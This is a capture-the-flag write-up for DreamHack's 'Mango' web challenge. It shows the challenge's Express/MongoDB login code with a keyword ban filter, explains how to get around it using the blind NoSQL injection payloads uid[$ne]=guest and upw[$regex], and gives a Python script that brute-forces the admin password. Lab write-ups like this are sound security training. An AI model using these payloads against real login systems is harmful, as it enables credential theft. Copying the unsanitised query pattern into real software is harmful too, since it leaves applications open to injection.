# Mango — DreamHack

> **Room / Challenge:** Mango (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** Mango (web)
- **Link**: `https://dreamhack.io/wargame/challenges/90`
- **Level:** `2`
- **Date:** `07-11-2025`

---

## Goal

Get the flag by leveraging blind NoSQL Injection.

## My Solution

You can download and examine the source code [here](./mango.zip).

The web app just have one `main.js` file to examine:

```javascript
const express = require("express");
const app = express();

const mongoose = require("mongoose");
mongoose.connect("mongodb://localhost/main", {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});
const db = mongoose.connection;

// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ["admin", "dh", "admi"];

filter = function (data) {
  const dump = JSON.stringify(data).toLowerCase();
  var flag = false;
  BAN.forEach(function (word) {
    if (dump.indexOf(word) != -1) flag = true;
  });
  return flag;
};

app.get("/login", function (req, res) {
  if (filter(req.query)) {
    res.send("filter");
    return;
  }
  const { uid, upw } = req.query;

  db.collection("user").findOne(
    {
      uid: uid,
      upw: upw,
    },
    function (err, result) {
      if (err) {
        res.send("err");
      } else if (result) {
        res.send(result["uid"]);
      } else {
        res.send("undefined");
      }
    }
  );
});

app.get("/", function (req, res) {
  res.send("/login?uid=guest&upw=guest");
});

app.listen(8000, "0.0.0.0");
```

We have to leverage `/login` route to get the flag. There is a filter function that prevents us from use `admin`, `dh` and `admi` in the route. For example, when we visit `/login?uid=admin&upw=DH{` received `filter`:

![Guide image](./screenshots/1.png)

Doing some research we can find this is Blind NoSQL Injection vulnerability, we don't need to use `admin`, `dh` and `admi` to point to `admin` account, this payload will works `uid[$ne]=guest` it will gets uid which is not `guest`, so it will select `admin` account.

For the `upw` (password) `upw[$regex]=^D[Hh]\{` payload will works. Combine this `/login?uid[$ne]=guest&upw[$regex]=^D[Hh]\{`, it will select `uid` which is not guest and if the `upw` has `DH{` in its value. Received `admin`:

![Guide image](./screenshots/2.png)

Then we just need to test `upw[$regex]=^D[Hh]\{a` => if `upw` is `DH{a`, if it returns `admin` it corrects. Therefore, here I created a automated Python script to get the flag:

```python
import requests
import string

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

target_url = "http://host8.dreamhack.games:12833/login?uid[$ne]=guest&upw[$regex]=^D[Hh]\\{"
received_flag_content = ""

for i in range(0, 32):
    for char in charset:
        print(f"Test {received_flag_content}{char}")
        res = requests.get(f"{target_url}{received_flag_content}{char}")

        if "admin" in res.text:
            received_flag_content += char
            print(f"[+] Got {received_flag_content}")
            print()
            break

print(f"Final flag content: {received_flag_content}")
```

![Guide image](./screenshots/3.png)
